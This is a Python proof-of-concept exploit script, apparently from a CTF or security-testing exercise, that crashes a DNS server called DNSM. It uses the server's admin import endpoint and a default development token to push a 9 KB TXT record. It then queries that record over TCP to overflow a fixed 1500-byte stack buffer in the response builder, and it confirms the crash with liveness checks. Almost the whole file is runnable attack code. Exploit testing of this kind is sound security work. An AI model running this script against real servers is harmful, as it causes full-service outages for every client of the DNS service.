#!/usr/bin/env python3
"""
PoC #2: Stack buffer overflow on the response-BUILD path (TCP)
-------------------------------------------------------------
Bug: the TCP query handler (tcp_worker() in dnsm.c) serializes its answer into
a fixed-size stack buffer `unsigned char resp[1500]` and calls assemble() with
enforce=0, so append_rr() memcpy's each record's RDATA into that buffer with no
check against its size. This is a *build-side* overflow, distinct from the
*parse-side* bug in PoC #1: the length that overflows comes from a record the
server is emitting, not from the query it is parsing.

The record's RDATA length is attacker-influenced: DNSM's admin import endpoint
(the same ops feature abused for SSRF in #4) lets you push zone data, including
a TXT record far larger than 1500 bytes. Querying that name *over TCP* then
overflows resp[1500] while building the reply and crashes the server process.

How this proves it, purely over the wire:
  1. Sanity: a normal TXT query over TCP returns a well-formed DNS message
     (the TCP build path works for normal records).
  2. Push an oversized (~9 KB) TXT record via the admin import endpoint.
  3. Query that name over TCP to trip the build-path overflow, then confirm
     the whole process is DEAD: repeated ordinary TCP queries (for an
     unrelated, small record) all fail. A live-before / dead-after transition
     is what proves this is a scoreboard-impacting, service-wide crash.

We deliberately do NOT judge success from the oversized query's own missing
reply. A single connection getting no answer proves nothing about the shared
service: a bounds-checked fix may legitimately drop or truncate the oversized
record (closing that one connection or returning nothing parseable) while the
process stays up and keeps serving every other client. That is a FIX, not a
DoS, and only a bystander-liveness check can tell the two apart -- so, like
PoC #1, confirmation is by a separate ordinary query going dark, never by the
attacking query's own fate.

Run the server first, then:
    python3 02_response_build_overflow.py [host] [dns_port] [admin_port]
"""
import socket
import struct
import sys
import time
import urllib.request

import os

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8053
ADMIN = int(sys.argv[3]) if len(sys.argv) > 3 else 8080
# The admin channel is credentialed the normal way: operators/automation send a
# per-deployment bearer token (DNSM_ADMIN_TOKEN, minted by generate-secrets.sh;
# entrypoint.sh defaults it to "dev-admin-token" for local dev). This PoC
# presents it so it exercises the response-BUILD overflow itself, NOT the admin
# gate - fixing the fail-open gate (#8) must not make this one report fixed.
ADMIN_TOKEN = os.environ.get("DNSM_ADMIN_TOKEN", "dev-admin-token")


def dns_name(n):
    return b"".join(bytes([len(l)]) + l.encode() for l in n.split(".") if l) + b"\x00"


def tcp_query(name, qtype, timeout=4.0):
    """Return the DNS payload, or None if no valid length-prefixed reply came back."""
    msg = struct.pack(">HHHHHH", 0x4242, 0x0100, 1, 0, 0, 0) + dns_name(name) + struct.pack(">HH", qtype, 1)
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(struct.pack(">H", len(msg)) + msg)
        hdr = s.recv(2)
        if len(hdr) < 2:
            return None
        ln = struct.unpack(">H", hdr)[0]
        data = b""
        while len(data) < ln:
            chunk = s.recv(ln - len(data))
            if not chunk:
                return None
            data += chunk
        return data
    except OSError:
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass


def server_alive(tries=4, timeout=3.0):
    """True if the server still answers an ordinary (small) TCP TXT query.

    A build-side overflow crashes the whole process, so after the attack a
    SEPARATE normal query is the honest liveness signal. We retry a few times
    (a healthy server always answers; only a dead process fails every try) and
    require a well-formed reply with an answer, not merely any bytes back."""
    for i in range(tries):
        r = tcp_query("info.example.com", 16, timeout=timeout)
        if r and len(r) >= 8 and struct.unpack(">H", r[6:8])[0] >= 1:
            return True
        time.sleep(0.3)
    return False


def main():
    # 1. normal TCP query works
    baseline = tcp_query("info.example.com", 16)
    if not baseline or struct.unpack(">H", baseline[6:8])[0] < 1:
        print("[-] normal TCP TXT query failed; cannot establish baseline")
        return 1
    print(f"[*] baseline: normal TCP TXT query returned {len(baseline)} bytes")

    # 2. push an oversized TXT record via the admin import feature
    big = "A" * 9000
    zone = f'$ORIGIN example.com.\ncrash TXT "{big}"\n'
    try:
        req = urllib.request.Request(f"http://{HOST}:{ADMIN}/admin/import",
                                     data=zone.encode(),
                                     headers={"X-Admin-Token": ADMIN_TOKEN})
        urllib.request.urlopen(req, timeout=5).read()
    except Exception as e:
        print(f"[-] could not push oversized TXT via admin import: {e}")
        return 1
    print("[*] pushed a ~9 KB TXT record (crash.example.com) via /admin/import")

    # 3. query it over TCP -> trips the build-side overflow if present. We
    #    ignore THIS query's own reply (or lack of one): a fix that safely
    #    drops/truncates the oversized record also yields no parseable answer
    #    here, so it tells us nothing on its own.
    resp = tcp_query("crash.example.com", 16)
    print(f"[*] oversized TXT query over TCP returned: "
          f"{'no valid reply' if resp is None else f'{len(resp)} bytes'} "
          "(not the verdict -- see liveness check below)")
    time.sleep(0.5)  # let a crash propagate and the process tear down

    # 4. VERDICT BY LIVENESS: is the whole service dead for everyone, or just
    #    this one connection? Only a dead process is a scoreable DoS.
    if server_alive():
        print("[-] the server still answers ordinary TCP queries after the oversized "
              "record: the response-build path did NOT crash the process. The oversized "
              "TXT was dropped/truncated safely (bounds check present) -> FIXED, not a DoS.")
        return 1

    print("[+] response-build overflow confirmed: after a single oversized-TXT query over "
          "TCP, the server that answered a normal query moments ago is now DEAD to every "
          "client -- the reply overran resp[1500] in tcp_worker() (assemble enforce=0) and "
          "crashed the whole process. One query, full-service outage.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
